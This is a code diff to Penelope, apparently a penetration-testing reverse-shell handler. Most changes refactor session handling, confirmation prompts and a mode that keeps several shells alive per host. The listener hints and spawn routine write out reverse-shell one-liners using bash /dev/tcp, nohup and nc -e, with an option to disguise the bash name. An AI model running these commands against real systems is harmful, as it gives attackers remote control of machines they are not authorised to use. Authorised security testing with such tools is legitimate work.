@@ -91,11 +91,31 @@ class MainMenu(cmd.Cmd):
 	def raw_commands(self):
 		return [re.split(' |\|',command)[0] for command in self.commands]
 
+	@property
+	def active_sessions(self):
+		active_sessions = len(core.sessions)
+		if active_sessions:
+			s = "s" if active_sessions > 1 else ""
+			return paint(f" ({active_sessions} active session{s})",'red')\
+			+ paint('', 'yellow', reset=False)
+		return ""
+
 	@staticmethod
 	def sessions(text, *extra):
 		options = list(map(str,core.sessions))
 		options.extend(extra)
 		return [option for option in options if option.startswith(text)]
+
+	@staticmethod
+	def confirm(text):
+		try:
+			__class__.set_auto_history(False)
+			answer = input(f"\r{paint(f'[?] {text} (y/N): ','yellow')}")
+			__class__.set_auto_history(True)
+			return answer.lower() == 'y'
+
+		except EOFError:
+			return __class__.confirm(text)
 
 	@staticmethod
 	def set_auto_history(state):
@@ -217,23 +237,12 @@ class MainMenu(cmd.Cmd):
 		"Kill a session"
 		if ID == 'all':
 			session_count = len(core.sessions)
+
 			if not session_count:
 				cmdlogger.warning("No sessions to kill")
 				return False
-
-			try:
-				if session_count > 1:
-					__class__.set_auto_history(False)
-					answer = input(f"\r{paint(f'[?] Kill all ({session_count}) sessions? (y/N): ','yellow')}")
-					__class__.set_auto_history(True)
-				else:
-					answer = 'y'
-
-			except EOFError:
-				return self.do_kill(line)
-
 			else:
-				if answer.lower() == 'y':
+				if __class__.confirm(f"Kill all sessions {self.active_sessions}"):
 					for session in core.sessions.copy().values():
 						session.kill()
 				return
@@ -311,26 +320,26 @@ class MainMenu(cmd.Cmd):
 
 		core.sessions[self.sid].spawn(port, host)
 
-	@session(current=True)
 	def do_maintain(self, line):
 		"""\
-		Maintain NUM active shells for the same target.
+		Maintain NUM active shells for each host.
 		"""
 		if line:
 			if line.isnumeric():
 				num = int(line)
-				if 2 <= num <= options.max_maintain:
-					options.maintain = num
-					core.sessions[self.sid].maintain()
-				else:
-					cmdlogger.warning(f"The value must be between 2 and {options.max_maintain}")
+				options.maintain = num
+				refreshed = False
+				for host in core.hosts.values():
+					if len(host) < num:
+						refreshed = True
+						host[0].maintain()
+				if not refreshed:
+					self.onecmd("maintain")
 			else:
 				cmdlogger.error("Invalid number")
 		else:
-			if options.maintain >= 2:
-				cmdlogger.info(f"Current value is {paint(options.maintain, 'yellow')}")
-			else:
-				cmdlogger.error("Maintain is currently disabled")
+			status = paint('Enabled', 'white', 'GREEN') if options.maintain >= 2 else paint('Disabled', 'white', 'RED')
+			cmdlogger.info(f"Value set to {paint(options.maintain, 'yellow')} {status}")
 
 	@session(current=True)
 	def do_upgrade(self, ID):
@@ -428,27 +437,11 @@ class MainMenu(cmd.Cmd):
 
 	def do_exit(self, line):
 		"""Exit penelope"""
-		try:
-			__class__.set_auto_history(False)
-
-			active_sessions = len(core.sessions)
-			warning = paint(f"({active_sessions} active session{'s' if active_sessions > 1 else ''}) ",
-				'red') + paint('', 'yellow', reset=False) if active_sessions else ""
-
-			answer = input(f"\r{paint(f'[?] Exit Penelope? {warning}(y/N): ','yellow')}")
-
-			__class__.set_auto_history(True)
-
-		except EOFError:
-			#print('\r')
-			return self.do_exit(line)
-
-		else:
-			if answer.lower() == 'y':
-				core.stop()
-				logger.info("Exited!")
-				return True
-			return False
+		if __class__.confirm(f"Exit Penelope?{self.active_sessions}"):
+			core.stop()
+			logger.info("Exited!")
+			return True
+		return False
 
 	def do_EOF(self, line):
 		#Unselect session when one is selected
@@ -583,6 +576,7 @@ class Core:
 		self.attached_session = None
 		self.ID = 0
 		self.started = False
+		self.lock = threading.Lock()
 
 	def __getattr__(self, name):
 		if name == 'newID':
@@ -613,8 +607,9 @@ class Core:
 			try:
 				readables, _, _ = select.select(self.checkables, [], [])
 
-			except ValueError:
-				pass
+			except (ValueError, OSError) as e:
+				logger.debug(e)
+				continue
 
 			for readable in readables:
 
@@ -680,8 +675,6 @@ class Core:
 								raise BrokenPipeError
 
 							if b'\x1b[?1049h' in data:
-#								if readable.type != 'PTY':
-#									data = data.replace(b'\x1b[?1049h', b'')
 								readable.alternate_buffer = True
 
 							if b'\x1b[?1049l' in data:
@@ -738,10 +731,10 @@ def Connect(host, port):
 		logger.error(f"Cannot reach {host}")
 
 	except OverflowError:
-		logger.error(f"Invalid port number. Valid numbers: 1-65535")
+		logger.error("Invalid port number. Valid numbers: 1-65535")
 
-	except ValueError as e:
-		logger.error(f"Port number must be numeric")
+	except ValueError:
+		logger.error("Port number must be numeric")
 
 	else:
 		core.start()
@@ -774,7 +767,7 @@ class Listener:
 			logger.error(f"Cannot bind to port {self.port}: Insufficient privileges")
 
 		except socket.gaierror:
-			logger.error(f"Cannot resolve hostname")
+			logger.error("Cannot resolve hostname")
 
 		except OSError as e:
 			if e.errno == errno.EADDRINUSE:
@@ -783,10 +776,10 @@ class Listener:
 				logger.error(f"Cannot listen on the requested address")
 
 		except OverflowError:
-			logger.error(f"Invalid port number. Valid numbers: 1-65535")
+			logger.error("Invalid port number. Valid numbers: 1-65535")
 
-		except ValueError as e:
-			logger.error(f"Port number must be numeric")
+		except ValueError:
+			logger.error("Port number must be numeric")
 
 		else:
 			logger.info(f"Listening for reverse shells on {paint(self.host,'blue')}"
@@ -814,8 +807,9 @@ class Listener:
 
 	def stop(self):
 
-		if options.single_session:
+		if options.single_session and core.sessions:
 			logger.info(f"Stopping {self} due to Single Session mode")
+
 		else:
 			logger.warning(f"Stopping {self}")
 
@@ -832,7 +826,7 @@ class Listener:
 	@property
 	def hints(self):
 		presets = [
-			'bash -c "/bin/bash >& /dev/tcp/{}/{} 0>&1 &"',
+			'bash -c "exec bash >& /dev/tcp/{}/{} 0>&1 &"',
 			'nc -e /bin/sh {} {}'
 		]
 		output = [paint(f"[{self} Hints] ===========---",'yellow')]
@@ -914,6 +908,7 @@ class Session:
 			if not core.started:
 				return
 
+#			with core.lock:
 			self.id = core.newID
 			core.sessions[self.id] = self
 			core.checkables.add(self)
@@ -931,33 +926,21 @@ class Session:
 				if not options.no_timestamps and not self.logpath.exists():
 					self.logfile.write(datetime.now().strftime(paint("%Y-%m-%d %H:%M:%S: ",'magenta')).encode())
 
-			if options.single_session and self.listener:
-				self.listener.stop()
-
 			self.maintain()
+
+			if options.single_session and self.listener in core.listeners:
+				self.listener.stop()
 
 			# If auto-attach is enabled and no other session is attached
 			if not options.no_attach and core.attached_session is None:
-				# If is reverse shell and the Menu is not active
-				if ((self.listener and not "Menu" in core.threads)
+				# If is reverse shell and the Menu is not active and reached the maintain value
+				if ((self.listener and not "Menu" in core.threads and len(core.sessions) == options.maintain)
 				# Or is a bind shell and is not spawned from the Menu
 				or (not self.listener and not "Menu" in core.threads)
 				# Or is a bind shell and is spawned from the connect Menu command
 				or (not self.listener and "Menu" in core.threads and menu.lastcmd.startswith('connect'))):
 					# Then attach the newly created session
 					self.attach()
-
-
-	def maintain(self):
-		current_num = len(core.hosts[self.name])
-		if current_num < options.maintain > 1:
-			try:
-				logger.warning(paint(f" ╒ Trying to maintain {options.maintain} "
-						f"active shells on {self.name} * |current {current_num}|",'blue')
-				)
-				core.hosts[self.name][-1].spawn()
-			except IndexError:
-				logger.error("No alive shell left. Cannot spawn another")
 
 	def __bool__(self):
 		return bool(self.socket.fileno() != -1 and self.OS)
@@ -983,6 +966,10 @@ class Session:
 			f"\t  {paint('OS Family: ','green')}{self.OS}\n"
 			f"\t  {paint('Source: ','green')}{source}"
 		)
+
+	def __repr__(self):
+		return (f"{__class__.__name__}({self.name}, {self.OS}, {self.type},"
+			f" interactive={self.interactive}, echoing={self.echoing})")
 
 	def fileno(self):
 		return self.socket.fileno()
@@ -1375,7 +1362,6 @@ class Session:
 				self.need_resize = False
 
 	def attach(self):
-
 		if not options.no_upgrade and not self.upgrade_attempted:
 			if not self.type == 'PTY' and not self.upgrade():
 				return False
@@ -1407,7 +1393,6 @@ class Session:
 		core.control << '+stdin'
 
 	def detach(self, killed=False):
-
 		core.control << '-stdin'
 		core.attached_session = None
 
@@ -1477,7 +1462,7 @@ class Session:
 				return specified
 
 			except Exception as e:
-				print(e)
+				logger.error(e)
 				logger.error("Corrupted response")
 				return []
 
@@ -1541,7 +1526,7 @@ class Session:
 						tar.add(item, arcname=altname)
 
 					except Exception as e:
-						logger.warning(f"{e}")
+						logger.error(e)
 						return False
 
 				altnames.append(altname)
@@ -1577,11 +1562,12 @@ class Session:
 				if not host: host = _host
 				logger.info(f"Attempting to spawn a reverse shell on {host}:{port}")
 				# bash -i doesn't always work
-				cmd = f'bash -c "exec bash >& /dev/tcp/{host}/{port} 0>&1 &"'
+				# cmd = f'bash -c "exec bash >& /dev/tcp/{host}/{port} 0>&1 &"'
+				cmd = f'bash -c "nohup bash >& /dev/tcp/{host}/{port} 0>&1 &"'
 				if options.no_bash:
 					cmd = cmd.replace('bash',rand())
 				#timeout=None if self.interactive else self.latency
-				response = self.exec(cmd)#,timeout=timeout)
+				response = self.exec(cmd, raw=False)#,timeout=timeout)
 				if response.startswith(b'sh: '):
 					logger.error("Bash does not exist on target. Cannot spawn reverse shell...")
 			else:
@@ -1592,7 +1578,20 @@ class Session:
 		elif self.OS == 'Windows':
 			logger.warning("Spawn Windows shells is not implemented yet")
 
+	def maintain(self):
+		current_num = len(core.hosts[self.name])
+		if current_num < options.maintain > 1:
+			try:
+				logger.warning(paint(f" * Trying to maintain {options.maintain} "
+						f"active shells on {self.name} * |current->{current_num}|",'blue')
+				)
+				logger.warning(f"spawning from session {core.hosts[self.name][-1].id}")
+				core.hosts[self.name][-1].spawn()
+			except IndexError:
+				logger.error("No alive shell left. Cannot spawn another")
+
 	def kill(self):
+		core.lock.acquire()
 
 		self.control << 'stop'
 
@@ -1624,6 +1623,7 @@ class Session:
 				logger.error(f"{paint(self.name,'RED','white')}"
 				f"{paint('','red',reset=False)} disconnected 💔\r")
 
+		core.lock.release()
 		self.maintain()
 
 	def exit(self):
@@ -1699,6 +1699,9 @@ class CustomFormatter(logging.Formatter):
 	def format(self, record):
 		template = __class__.TEMPLATES[record.levelno]
 		if core.attached_session is not None: print()
+#		x=""
+#		if core.attached_session is not None: x="\r"
+#		text = f"\r{template['prefix']} {logging.Formatter.format(self, record)}"+x
 		text = f"\r{template['prefix']} {logging.Formatter.format(self, record)}"
 		return paint(text, template['color'])
 
@@ -1712,7 +1715,8 @@ def ControlC(num, stack):
 		#os.write(sys.stdout.fileno(),menu.prompt.encode())
 		if menu.sid:
 			core.sessions[menu.sid].control << 'stop'
-	else:
+
+	elif not core.sessions:
 		core.stop()
 
 
@@ -1770,7 +1774,6 @@ rand = lambda: ''.join(random.choice(string.ascii_letters) for i in range(8))
 
 chunks = lambda string, length: (string[0+i:length+i] for i in range(0, len(string), length))
 
-
 # EXTRAS
 options.recon_scripts = {
 'Unix':[
@@ -1825,7 +1828,7 @@ log.add_argument("-L", "--no-log", help="Do not create session log files", actio
 log.add_argument("-T", "--no-timestamps", help="Do not include timestamps on logs", action="store_true")
 
 misc = parser.add_argument_group("Misc")
-misc.add_argument("-m", "--maintain", help="Maintain NUM total shells per target", type=int, default=0, metavar='')
+misc.add_argument("-m", "--maintain", help="Maintain NUM total shells per target", type=int, default=1, metavar='')
 misc.add_argument("-H", "--no-history", help="Disable shell history on target", action="store_true")
 misc.add_argument("-P", "--plain", help="Just land to the main menu", action="store_true")
 misc.add_argument("-S", "--single-session", help="Accommodate only the first created session", action="store_true")
